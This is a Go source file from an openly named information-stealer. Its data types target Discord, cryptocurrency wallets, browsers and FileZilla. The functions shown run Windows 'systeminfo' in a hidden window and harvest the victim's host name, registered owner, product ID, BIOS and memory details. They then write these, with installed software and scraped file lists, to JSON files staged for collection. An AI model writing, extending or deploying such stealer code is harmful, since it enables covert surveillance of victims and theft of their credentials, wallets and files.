package main

import (
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
	"time"
)

type Apps struct {
	Discord   Discord
	Wallets   []Wallet
	Browsers  []Browser
	FileZilla FileZilla
}

type OS struct {
	DisplayName     string
	ComputerName    string
	Name            string
	Version         string
	Configuration   string
	BuildType       string
	RegisteredOwner string
	ProductID       string
	BIOS            string
}

func (stealer *Stealer) WriteSystemJson() {
	defer TimeTrack(time.Now())

	// Write system related information structs as json objects to the Output directory
	var systemOutputPath = CleanPath(outputPath + "\\System\\")
	if os.Mkdir(systemOutputPath, 0666) != nil {
		return
	}

	osFile := File{Path: CleanPath(systemOutputPath + "\\" + "general.json")}
	osFile.WriteJson(stealer.OS)
	osFile.Move(systemOutputPath)

	netFile := File{Path: CleanPath(systemOutputPath + "\\" + "network.json")}
	netFile.WriteJson(stealer.Network)
	netFile.Move(systemOutputPath)

	if len(stealer.Memory.InstalledSoftware) > 0 {
		softwareFile := File{Path: CleanPath(systemOutputPath + "\\" + "software.json")}
		softwareFile.WriteJson(stealer.Memory.InstalledSoftware)
		softwareFile.Move(systemOutputPath)
	}

	if getScrapedFiles {
		scrapeFile := File{Path: CleanPath(systemOutputPath + "\\" + "files.json")}
		scrapeFile.WriteJson(stealer.Memory.Files)
		scrapeFile.Move(systemOutputPath)
	}
}

func (stealer *Stealer) GetSystemInfo() {
	defer TimeTrack(time.Now())
	cmd := exec.Command("systeminfo")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	if err != nil {
		return
	}

	currentUser, err := user.Current()
	if err != nil || currentUser.Name == "" {
		stealer.OS.DisplayName = "Unknown"
	} else {
		stealer.OS.DisplayName = currentUser.Name
	}

	// Parse output to populate struct fields
	fields := strings.Split(string(out), "\n")
	for _, line := range fields {
		// Split each row into a key-value pair
		fields := strings.Split(line, ":")
		if len(fields) < 2 {
			continue
		}
		key := strings.TrimSpace(fields[0])
		value := strings.TrimSpace(fields[1])

		switch key {
		case "Host Name":
			stealer.OS.ComputerName = value
		case "OS Name":
			stealer.OS.Name = value
		case "OS Version":
			stealer.OS.Version = value
		case "OS Configuration":
			stealer.OS.Configuration = value
		case "OS Build Type":
			stealer.OS.BuildType = value
		case "Registered Owner":
			stealer.OS.RegisteredOwner = value
		case "Product ID":
			stealer.OS.ProductID = value
		case "BIOS Version":
			stealer.OS.BIOS = value
		case "Total Physical Memory":
			stealer.Memory.TotalRAM = value
		case "Boot Device":
			stealer.Memory.BootDevice = value
		case "Available Physical Memory":
			stealer.Memory.FreeRAM = value
		}
	}
}
